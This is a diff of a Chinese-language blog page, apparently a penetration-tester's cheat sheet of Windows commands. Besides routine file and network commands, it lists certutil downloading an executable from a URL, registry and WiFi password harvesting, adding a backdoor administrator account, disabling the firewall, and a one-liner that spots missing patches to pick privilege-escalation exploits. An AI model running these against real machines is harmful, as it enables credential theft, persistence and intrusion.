@@ -7,14 +7,14 @@
   
   <title>常用Windows命令大全 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="常用Windows命令大全   渗透命令certutil—–从远程url下载文件 案例:certutil -urlcache  -split  -f http:&#x2F;&#x2F;baidu.com&#x2F;test.exe findstr—–查找文件后缀结果 findstr &#x2F;s &#x2F;i “pass” .py reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s—–搜集注册表中的各种密码数据 查">
+  <meta name="description" content="常用Windows命令大全   渗透命令 certutil—–从远程url下载文件  案例:certutil -urlcache  -split  -f http:&#x2F;&#x2F;baidu.com&#x2F;test.exe  findstr—–查找文件后缀结果  findstr &#x2F;s &#x2F;i “pass” .py  reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s—–搜集注册表中的各种密">
 <meta property="og:type" content="article">
 <meta property="og:title" content="常用Windows命令大全">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;03&#x2F;%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8&#x2F;index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="常用Windows命令大全   渗透命令certutil—–从远程url下载文件 案例:certutil -urlcache  -split  -f http:&#x2F;&#x2F;baidu.com&#x2F;test.exe findstr—–查找文件后缀结果 findstr &#x2F;s &#x2F;i “pass” .py reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s—–搜集注册表中的各种密码数据 查">
+<meta property="og:description" content="常用Windows命令大全   渗透命令 certutil—–从远程url下载文件  案例:certutil -urlcache  -split  -f http:&#x2F;&#x2F;baidu.com&#x2F;test.exe  findstr—–查找文件后缀结果  findstr &#x2F;s &#x2F;i “pass” .py  reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s—–搜集注册表中的各种密">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-02-06T04:51:33.614Z">
+<meta property="og:updated_time" content="2020-02-18T12:02:21.585Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="../../../../atom.xml" title="Hexo" type="application/atom+xml">
@@ -86,64 +86,125 @@
       
         <center><h2>常用Windows命令大全</h2></center> 
 
-<h3 id="渗透命令"><a href="#渗透命令" class="headerlink" title="渗透命令"></a>渗透命令</h3><p>certutil—–从远程url下载文件</p>
+<h3 id="渗透命令"><a href="#渗透命令" class="headerlink" title="渗透命令"></a>渗透命令</h3><ul>
+<li>certutil—–从远程url下载文件</li>
+</ul>
 <p>案例:certutil -urlcache  -split  -f <a href="http://baidu.com/test.exe" target="_blank" rel="noopener">http://baidu.com/test.exe</a></p>
-<p>findstr—–查找文件后缀结果</p>
-<p>findstr /s /i “pass” <em>.py</em></p>
-<p>reg query HKLM /f password /t REG_SZ /s—–搜集注册表中的各种密码数据</p>
+<ul>
+<li><p>findstr—–查找文件后缀结果</p>
+</li>
+<li><p>findstr /s /i “pass” <em>.py</em></p>
+</li>
+<li><p>reg query HKLM /f password /t REG_SZ /s—–搜集注册表中的各种密码数据</p>
+</li>
+</ul>
 <p>查看有没有开启远程链接，运行下面命令：</p>
-<p>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections</p>
+<ul>
+<li>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections</li>
+</ul>
 <p>结果：1表示关闭，0表示开启</p>
 <p>快速查找未打补丁的exp</p>
-<p>systeminfo&gt;bzhack.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i “%i”|| @echo %i you can exp)&amp;del /f /q /a bzhack.txt</p>
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>ipconfig/all—–网络配置情况</p>
-<p>ipconfig /displaydns—–查看本地DNS缓存</p>
-<p>netsh wlan show profile—–查看连接过的 wifi 名</p>
-<p>netsh wlan show profile WiFi-name key=clear 获取 wifi 对应的的密码</p>
-<p>query user—–查当前机器中正在线的用户,看管理员在不在</p>
-<p>net view——显示域列表/计算机列表</p>
-<p>net user——查看当前所有账号，判断域规模</p>
-<p>net group—–查看当前域所有的组名</p>
-<p>net user bzhack pass /add—–增加用户</p>
-<p>net user bzhack /del—–删除用户</p>
-<p>net Localgroup—–添加、显示本地组</p>
-<p>net localgroup administrators bzhack /add—–将bzhack加入管理员组</p>
-<p>net share—–  查看当前机器开启的共享</p>
-<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p>md—–建文件夹</p>
-<p>rd—–删除文件夹</p>
-<p>tree—–显示文件夹结构</p>
-<p>dir—–显示磁盘目录内容</p>
-<p>copy—–复制文件</p>
-<p>Xcopy—–copy加强版，复制文件夹</p>
-<p>del—–删除文件</p>
-<p>ren—–[原文件/夹名][新文件/夹名]修改文件名</p>
-<p>type—–查看文本内容</p>
-<p>dir /a /s /b d:&quot;*.conf”—–搜索d盘里conf结尾的文件</p>
-<p>edit—–文本编辑</p>
-<p>type—–显示文件内容</p>
-<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><p>netstat -a—– 列出所有端口</p>
-<p>netstat -p—– 显示 PID 和进程名称</p>
-<p>netstat -r—– 显示核心路由信息</p>
-<p>netstat -at—–列出所有tcp连接 </p>
-<p>netstat -au—–列出所有ucp连接</p>
-<p>netstat -an |find “3389”   查看开启3389端口的信息</p>
-<p>netstat -ano | findstr “ESTABLISHED”  查看当前正处于连接状态的端口及ip</p>
-<p>netstat -ano | findstr “LISTENING”  查看当前正处于监听状态的端口及ip</p>
-<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>ver—–查看版本 </p>
-<p>hostname—–查看机器名  </p>
-<p>whoami—–查看权限</p>
-<p>systeminfo—–查看配置</p>
-<p>tasklist—–查看进程</p>
-<p>cls—–清屏</p>
-<p>net start—–查看开启的服务，比如Terminal Services 远程连接服务</p>
-<p>net stop sharedaccess—–关闭防火墙</p>
-<p>set—–查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境</p>
-<p>fsutil fsinfo drives—–列出当前机器上的所有盘符</p>
+<ul>
+<li>systeminfo&gt;bzhack.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i “%i”|| @echo %i you can exp)&amp;del /f /q /a bzhack.txt</li>
+</ul>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul>
+<li><p>ipconfig/all—–网络配置情况</p>
+</li>
+<li><p>ipconfig /displaydns—–查看本地DNS缓存</p>
+</li>
+<li><p>netsh wlan show profile—–查看连接过的 wifi 名</p>
+</li>
+<li><p>netsh wlan show profile WiFi-name key=clear 获取 wifi 对应的的密码</p>
+</li>
+<li><p>query user—–查当前机器中正在线的用户,看管理员在不在</p>
+</li>
+<li><p>net view——显示域列表/计算机列表</p>
+</li>
+<li><p>net user——查看当前所有账号，判断域规模</p>
+</li>
+<li><p>net group—–查看当前域所有的组名</p>
+</li>
+<li><p>net user bzhack pass /add—–增加用户</p>
+</li>
+<li><p>net user bzhack /del—–删除用户</p>
+</li>
+<li><p>net Localgroup—–添加、显示本地组</p>
+</li>
+<li><p>net localgroup administrators bzhack /add—–将bzhack加入管理员组</p>
+</li>
+<li><p>net share—–  查看当前机器开启的共享</p>
+</li>
+</ul>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
+<li><p>md—–建文件夹</p>
+</li>
+<li><p>rd—–删除文件夹</p>
+</li>
+<li><p>tree—–显示文件夹结构</p>
+</li>
+<li><p>dir—–显示磁盘目录内容</p>
+</li>
+<li><p>copy—–复制文件</p>
+</li>
+<li><p>Xcopy—–copy加强版，复制文件夹</p>
+</li>
+<li><p>del—–删除文件</p>
+</li>
+<li><p>ren—–[原文件/夹名][新文件/夹名]修改文件名</p>
+</li>
+<li><p>type—–查看文本内容</p>
+</li>
+<li><p>dir /a /s /b d:&quot;*.conf”—–搜索d盘里conf结尾的文件</p>
+</li>
+<li><p>edit—–文本编辑</p>
+</li>
+<li><p>type—–显示文件内容</p>
+</li>
+</ul>
+<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><ul>
+<li><p>netstat -a—– 列出所有端口</p>
+</li>
+<li><p>netstat -p—– 显示 PID 和进程名称</p>
+</li>
+<li><p>netstat -r—– 显示核心路由信息</p>
+</li>
+<li><p>netstat -at—–列出所有tcp连接 </p>
+</li>
+<li><p>netstat -au—–列出所有ucp连接</p>
+</li>
+<li><p>netstat -an |find “3389”   查看开启3389端口的信息</p>
+</li>
+<li><p>netstat -ano | findstr “ESTABLISHED”  查看当前正处于连接状态的端口及ip</p>
+</li>
+<li><p>netstat -ano | findstr “LISTENING”  查看当前正处于监听状态的端口及ip</p>
+</li>
+</ul>
+<h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><ul>
+<li></li>
+<li><p>hostname—–查看机器名  </p>
+</li>
+<li><p>whoami—–查看权限</p>
+</li>
+<li><p>systeminfo—–查看配置</p>
+</li>
+<li><p>tasklist—–查看进程</p>
+</li>
+<li><p>cls—–清屏</p>
+</li>
+<li><p>net start—–查看开启的服务，比如Terminal Services 远程连接服务</p>
+</li>
+<li><p>net stop sharedaccess—–关闭防火墙</p>
+</li>
+<li><p>set—–查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境</p>
+</li>
+<li><p>fsutil fsinfo drives—–列出当前机器上的所有盘符</p>
+</li>
+</ul>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/03/%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" data-id="ck6rtuwrh000gjosv16phelbo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/12/03/%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" data-id="ck6rvaosg000dtcsv94sn1zwn" class="article-share-link">Share</a>
       
       
     </footer>
